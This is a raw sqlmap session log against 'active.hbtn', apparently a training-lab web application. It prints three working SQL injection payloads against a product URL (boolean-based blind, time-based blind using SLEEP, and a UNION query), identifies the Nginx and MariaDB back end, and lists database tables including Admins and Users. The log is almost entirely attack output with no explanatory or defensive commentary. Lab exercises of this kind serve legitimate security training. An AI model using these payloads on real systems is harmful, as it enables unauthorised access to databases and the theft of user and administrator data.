        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:20:16 /2025-08-28/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://active.hbtn/product/1' AND 6474=6474-- yzZD

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://active.hbtn/product/1' AND (SELECT 1609 FROM (SELECT(SLEEP(5)))vtIy)-- JMra

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: http://active.hbtn/product/1' UNION ALL SELECT NULL,NULL,CONCAT(0x71717a7a71,0x7265726e537964724a64454145796e6342527162714676434f67576b6775594f52675a6c52724752,0x71706a7871),NULL-- -
---
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
Database: active.hbtn
[4 tables]
+----------+
| Admins   |
| Orders   |
| Products |
| Users    |
+----------+


[*] ending @ 13:20:18 /2025-08-28/

